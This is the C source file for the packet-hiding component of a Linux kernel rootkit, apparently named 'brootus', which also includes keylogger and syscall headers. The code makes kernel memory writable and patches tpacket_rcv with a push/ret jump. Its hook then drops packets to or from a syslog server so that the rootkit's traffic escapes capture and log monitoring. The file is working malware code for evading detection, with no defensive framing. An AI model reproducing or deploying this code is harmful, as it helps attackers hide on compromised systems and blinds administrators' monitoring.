#include <linux/kernel.h>
#include <net/ip.h>

#include "kernel_functions.h"
#include "syscall.h"
#include "keylogger.h"
#include "packet_hiding.h"

#define JUMP_CODE_SIZE 6
#define JUMP_CODE_ADDR_OFFSET 1

// x86 assembler for:
// push $0x00000000 ; address to be adjusted
// ret
//
// These instructions result in a jump to the absolute address
// without destroying any register values
char jump_code[JUMP_CODE_SIZE] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
char original_tpacket_rcv_code[JUMP_CODE_SIZE];
int original_page_permissions;

// A lock to avoid interfering of hooking and restoring (especially
// when calling the original funcion)
spinlock_t hook_lock;

// The hooked receive function
int brootus_tpacket_rcv(struct sk_buff* skb, struct net_device* dev,
                       struct packet_type* pt, struct net_device* orig_dev)
{
  int ret;

  //Check if the packet is IPv4
  if (skb->protocol == htons(ETH_P_IP)) {
    // Extract IP header
    struct iphdr* iph = (struct iphdr*) skb_network_header(skb);

    // Check if our syslog IP is involved
    if (iph->saddr == syslog_ip_bin || iph->daddr == syslog_ip_bin) {
      printk(KERN_ERR "Blocking traffic to syslog server");
      return 0;
    }
  }
  // Call the original function
  disable_packet_hiding();
  ret = fn_tpacket_rcv(skb, dev, pt, orig_dev);
  enable_packet_hiding();

  return ret;
}

void enable_packet_hiding(void)
{
  unsigned int* jump_addr = (unsigned int*) (jump_code + JUMP_CODE_ADDR_OFFSET);
  spin_lock(&hook_lock);

  // Replace the jump target with our hooked function
  *jump_addr = (unsigned int) brootus_tpacket_rcv;

  // Save and replace the function's first instructions
  memcpy(original_tpacket_rcv_code, fn_tpacket_rcv, JUMP_CODE_SIZE);
  memcpy(fn_tpacket_rcv, jump_code, JUMP_CODE_SIZE);

  spin_unlock(&hook_lock);
}

void disable_packet_hiding(void)
{
  spin_lock(&hook_lock);
  // Restore the original function
  memcpy(fn_tpacket_rcv, original_tpacket_rcv_code, JUMP_CODE_SIZE);
  spin_unlock(&hook_lock);
}

void init_packet_hiding(void)
{
  // Allow writes to the page which contains the function to hook
  original_page_permissions = set_addr_rw((unsigned int) fn_tpacket_rcv);
  enable_packet_hiding();
}

void finalize_packet_hiding(void)
{
  // Restore page permissions
  disable_packet_hiding();
  set_pte_permissions((unsigned int) fn_tpacket_rcv, original_page_permissions);
}

